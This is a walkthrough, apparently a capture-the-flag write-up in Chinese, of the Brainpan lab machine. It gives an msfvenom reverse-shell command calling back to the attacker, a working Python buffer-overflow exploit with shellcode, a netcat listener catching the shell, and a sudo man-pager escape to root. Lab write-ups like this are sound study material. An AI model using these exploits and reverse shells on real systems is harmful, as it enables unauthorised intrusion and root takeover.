OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : brainpan
Logged On Users : 1
Meterpreter     : x86/windows


```

于是我们另外编译一个linux的shell，由上可知这台机器是x86架构的

> msfvenom -p linux/x86/shell_reverse_tcp  LHOST=10.13.21.169  LPORT=4444 EXITFUNC=thread -b "\x00" -f c

我们把上面生成的payload放到下面的攻击脚本中
```
import socket

ip = "10.10.80.112"
port = 9999

prefix = "OVERFLOW1 "
offset = 514 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"

padding = "\x90" * 16

buf = ""
buf +="\xd9\xcd\xd9\x74\x24\xf4\xbe\x81\x04\xa8\x7a\x58\x33\xc9\xb1"
buf +="\x12\x83\xc0\x04\x31\x70\x13\x03\xf1\x17\x4a\x8f\xc0\xcc\x7d"
buf +="\x93\x71\xb0\xd2\x3e\x77\xbf\x34\x0e\x11\x72\x36\xfc\x84\x3c"
buf +="\x08\xce\xb6\x74\x0e\x29\xde\x8c\xfd\xdc\xb7\xf9\xff\xde\xd6"
buf +="\xa5\x76\x3f\x68\x33\xd9\x91\xdb\x0f\xda\x98\x3a\xa2\x5d\xc8"
buf +="\xd4\x53\x71\x9e\x4c\xc4\xa2\x4f\xee\x7d\x34\x6c\xbc\x2e\xcf"
buf +="\x92\xf0\xda\x02\xd4";



payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

开启监听，执行，收到反弹shell
```
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.80.112] 47943
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
whoami
puck

```

用```python3 -c "__import__('pty').spawn('/bin/bash')"```切换成tty，查看sudo特权
```
python3 -c "__import__('pty').spawn('/bin/bash')"
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

```anansi_util```看起来像是一个自定义命令，尝试执行：
```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]

```

弹出了一个manu名单，后面应该是接相应的命令

经过测试network相当于ifconfig命令，manual相当于man命令，proclist不知道是什么

我们可以根据manual命令进行权限提升

首先执行：```sudo /home/anansi/bin/anansi_util manual man```

其次执行：```!/bin/sh```

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
sudo /home/anansi/bin/anansi_util manual man
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/sh
!/bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
# 
```

成功提权到root。


原文链接：https://github.com/maxzxc0110/hack-study/blob/main/tryhackme/Brainpan.md